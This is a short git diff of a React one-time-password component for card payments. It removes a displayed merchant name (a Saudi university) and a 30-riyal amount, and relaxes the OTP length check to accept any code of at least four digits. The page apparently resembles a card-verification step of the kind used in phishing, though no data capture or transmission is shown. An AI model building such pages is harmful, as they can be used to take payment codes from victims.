@@ -94,17 +94,6 @@ const OTP = ({ setMode, checkMode }) => {
         </h2>
 
         <div className="flex justify-between py-1">
-          <span className="font-bold"> Merchant:</span>
-          <span>Princess Nourah University</span>
-        </div>
-        <div className="flex justify-between py-1">
-          <span className="font-bold">Transaction Amount:</span>
-          <span className="" dir="rtl">
-            {" "}
-            30 ريال
-          </span>
-        </div>
-        <div className="flex justify-between py-1">
           <span className="font-bold">Card Number:</span>
           <span>
             ********
@@ -118,8 +107,7 @@ const OTP = ({ setMode, checkMode }) => {
             required
             onChange={(e) => setOtp(e.target.value)}
             dir="ltr"
-            maxLength={6}
-            minLength={6}
+            minLength={4}
             inputMode="numeric"
             type="text"
             className="border px-3 py-1 font-light border-gray-400 text-base outline-[#ffc107] rounded-md w-1/2"
